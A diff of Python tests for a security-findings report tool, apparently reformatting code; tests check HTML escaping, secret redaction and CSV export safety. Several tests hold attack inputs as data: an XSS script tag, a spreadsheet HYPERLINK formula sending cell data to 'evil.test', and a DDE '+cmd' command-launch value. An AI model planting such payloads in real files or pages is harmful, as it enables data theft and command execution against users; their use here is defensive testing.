@@ -22,9 +22,7 @@ def test_builder_filters_by_severity_threshold(repo: StorageRepository) -> None:
     pid = _project(repo)
     repo.create_finding(make_finding(pid, title="High", severity="high"))
     repo.create_finding(make_finding(pid, title="Low", severity="low"))
-    data = build_report_data(
-        repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH)
-    )
+    data = build_report_data(repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH))
     assert [f.title for f in data.findings] == ["High"]
 
 
@@ -32,9 +30,7 @@ def test_builder_explicit_finding_ids_overrides_other_filters(repo: StorageRepos
     pid = _project(repo)
     f1 = repo.create_finding(make_finding(pid, title="A", severity="low"))
     repo.create_finding(make_finding(pid, title="B", severity="critical"))
-    data = build_report_data(
-        repo, ReportFilters(project_id=pid, finding_ids=[f1.finding_id])
-    )
+    data = build_report_data(repo, ReportFilters(project_id=pid, finding_ids=[f1.finding_id]))
     assert [f.title for f in data.findings] == ["A"]
 
 
@@ -45,9 +41,7 @@ def test_builder_asset_inventory_toggle(repo: StorageRepository) -> None:
     repo.update_finding(pid, f.finding_id, {"affected_asset_ids": [linked.asset_id]})
     repo.create_asset(make_asset(pid, locator="unrelated.test"))
 
-    with_all = build_report_data(
-        repo, ReportFilters(project_id=pid, include_asset_inventory=True)
-    )
+    with_all = build_report_data(repo, ReportFilters(project_id=pid, include_asset_inventory=True))
     assert len(with_all.assets) == 2
 
     only_linked = build_report_data(
@@ -59,8 +53,11 @@ def test_builder_asset_inventory_toggle(repo: StorageRepository) -> None:
 def test_html_escapes_xss_payloads_in_titles_and_summaries(repo: StorageRepository) -> None:
     pid = _project(repo)
     payload = "<script>alert(1)</script>"
-    repo.create_finding(make_finding(pid, title=payload, summary=payload,
-                                     business_impact=payload, remediation=payload))
+    repo.create_finding(
+        make_finding(
+            pid, title=payload, summary=payload, business_impact=payload, remediation=payload
+        )
+    )
     data = build_report_data(repo, ReportFilters(project_id=pid))
     html = render_html(data)
     assert "<script>alert(1)</script>" not in html
@@ -89,9 +86,7 @@ def test_zero_finding_report_states_executed_checks_found_none(repo: StorageRepo
     assert "No findings were detected by the checks executed" in html
     assert "no vulnerabilities exist" not in html.lower()
 
-    pdf_text = "\n".join(
-        p.extract_text() for p in PdfReader(io.BytesIO(render_pdf(data))).pages
-    )
+    pdf_text = "\n".join(p.extract_text() for p in PdfReader(io.BytesIO(render_pdf(data))).pages)
     assert "No findings were detected by the checks executed" in pdf_text
 
 
@@ -138,9 +133,7 @@ def test_findings_json_export_is_schema_versioned_and_matches_selection(
     pid = _project(repo)
     repo.create_finding(make_finding(pid, title="Only this one", severity="high"))
     repo.create_finding(make_finding(pid, title="Excluded", severity="low"))
-    data = build_report_data(
-        repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH)
-    )
+    data = build_report_data(repo, ReportFilters(project_id=pid, severity_threshold=Severity.HIGH))
     import json
 
     payload = json.loads(findings_to_json(data))
@@ -187,14 +180,20 @@ def test_no_secret_assertions_across_html_pdf_json_csv(repo: StorageRepository) 
     _secret_fragments = ("not", "a", "real", "credential", "fedcba9876543210fedcba9876543210")
     secret = "-".join(_secret_fragments)
     f = make_finding(
-        pid, title="Leaky header", summary=f"Authorization: Bearer {secret}",
-        technical_detail=f'password="{secret}"', remediation=f"rotate token={secret}",
+        pid,
+        title="Leaky header",
+        summary=f"Authorization: Bearer {secret}",
+        technical_detail=f'password="{secret}"',
+        remediation=f"rotate token={secret}",
     )
     created = repo.create_finding(f)
     repo.save_evidence(
         EvidenceMetadata(
-            evidence_id="evd_" + "9" * 32, project_id=pid, finding_ids=[created.finding_id],
-            evidence_type="http_exchange", request_excerpt=f"Cookie: session={secret}",
+            evidence_id="evd_" + "9" * 32,
+            project_id=pid,
+            finding_ids=[created.finding_id],
+            evidence_type="http_exchange",
+            request_excerpt=f"Cookie: session={secret}",
             response_excerpt="ok",
         )
     )
@@ -219,13 +218,15 @@ def test_csv_export_neutralizes_spreadsheet_formula_injection(repo: StorageRepos
     formula when the CSV is opened in Excel/Sheets (OWASP CSV injection) — a realistic vector
     since finding text can come from an imported, attacker-influenced scan report."""
     pid = _project(repo)
-    payload = "=HYPERLINK(\"http://evil.test/\"&A1,\"click\")"
+    payload = '=HYPERLINK("http://evil.test/"&A1,"click")'
     repo.create_finding(make_finding(pid, title=payload, remediation="+cmd|' /C calc'!A1"))
     data = build_report_data(repo, ReportFilters(project_id=pid))
     csv_text = findings_to_csv(data).decode()
     for line in csv_text.splitlines()[1:]:
         for cell in line.split(","):
-            assert not cell.startswith(("=", "+", "-", "@")), f"unsafe formula-leading cell: {cell!r}"
+            assert not cell.startswith(("=", "+", "-", "@")), (
+                f"unsafe formula-leading cell: {cell!r}"
+            )
     # the content itself survives, just neutralized with a leading quote
     assert "HYPERLINK" in csv_text
     assert "'=HYPERLINK" in csv_text
